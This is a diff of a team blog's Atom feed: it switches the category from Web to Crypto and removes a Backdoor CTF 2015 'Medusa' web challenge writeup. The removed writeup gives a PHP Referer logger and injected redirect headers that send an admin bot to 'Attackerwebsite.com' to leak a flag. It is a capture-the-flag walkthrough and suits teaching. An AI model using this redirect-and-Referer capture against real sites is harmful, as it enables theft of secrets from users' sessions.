@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[Category: Web | GeeksSpeak Team Blog]]></title>
-  <link href="http://geeksspeak.github.io/blog/categories/web/atom.xml" rel="self"/>
+  <title><![CDATA[Category: Crypto | GeeksSpeak Team Blog]]></title>
+  <link href="http://geeksspeak.github.io/blog/categories/crypto/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
   <updated>2015-04-05T03:29:32+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
@@ -190,90 +190,6 @@ logs/2015-04-04_admin
 <p>Interesting challenge So we&rsquo;ve got 200pts.</p>
 
 <p>HAMIDx9</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF 2015 - Medusa Writeup]]></title>
-    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup/"/>
-    <updated>2015-04-03T01:06:09+04:30</updated>
-    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup</id>
-    <content type="html"><![CDATA[<p><strong>Backdoor2015 Medusa Writeup</strong><br/>
-<strong>Point = 100</strong><br/>
-<strong>Category = Web</strong><br/>
-<strong>Description : </strong></p>
-
-<blockquote><p>The html page you create will be visited by the backdoor admin with the flag.
-You can enter a fake flag to simulate the challenge.</p>
-
-<p>Get the flag at <a href="http://hack.bckdr.in/MEDUSA/">http://hack.bckdr.in/MEDUSA/</a></p></blockquote>
-
-<p>After We open the link that is provided in description we are welcomed with a form.you can send message with html code and after that admin will visit your page with the flag.</p>
-
-<!-- more -->
-
-
-<p><img src="http://up.ashiyane.org/images/nxcfynwxymxjqi2v4u7.png" title="Medusa Form" alt="alt text" /></p>
-
-<p>Backdoor CTF admin add a hint and mention that they sent flag as post request</p>
-
-<p>this is sample request that admin sent :</p>
-
-<p><a href="http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG">http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG</a></p>
-
-<p>when you sent the message Medusa website create id for you.
-you can visit your message with this id ( same as admin :D )</p>
-
-<p><img src="http://up.ashiyane.org/images/wu0fm2e5n6shme48fj58.png" title="Message Read" alt="alt text" /></p>
-
-<p>we test different method to get the flag value from post request with PHP or JavaScript in our page but we see error or blank page.</p>
-
-<blockquote><p>after some investigation our team found answer !!!</p></blockquote>
-
-<p>we can redirect admin to another page and get the flag</p>
-
-<p>but if they sent request as post cant log the value in second page.so thinking to Referer attribute in the header.</p>
-
-<p>write some code to get and save the Referer in the text file when admin redirect to our PHP page :
-Server.php</p>
-
-<pre><code>&lt;?php
-$ref = $_SERVER['HTTP_REFERER'];
-file_put_contents("flag.txt",$ref);
-?&gt;
-</code></pre>
-
-<blockquote><p>and sent this code as our page to Medusa form :</p>
-
-<pre><code>---
-location: http://Attackerwebsite.com/server.php
----
-Can you get the **flag**?
-</code></pre>
-
-<p>but after admin visit the link flag.txt is empty !!!</p></blockquote>
-
-<p>no Referer sent to PHP page&hellip;</p>
-
-<p>we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt</p>
-
-<p>after some research we found out with this kind of header redirection we cant get Referer and we should change that.</p>
-
-<pre><code>---
-Refresh: 0; url=http://Attackerwebsite.com/server.php
----
-Can you get the **flag**?
-</code></pre>
-
-<p>and guess what?</p>
-
-<blockquote><p>we have Referer Link in flag.txt :D</p></blockquote>
-
-<p><a href="http://hack.bckdr.in/MEDUSA/view.php?flag=[redacted]&amp;id=d61d051c6e741595491c">Referer Link With Flag!</a></p>
-
-<p>and now you have 100 point :D</p>
-
-<p>WriteUp By Fr0nk</p>
 ]]></content>
   </entry>
   
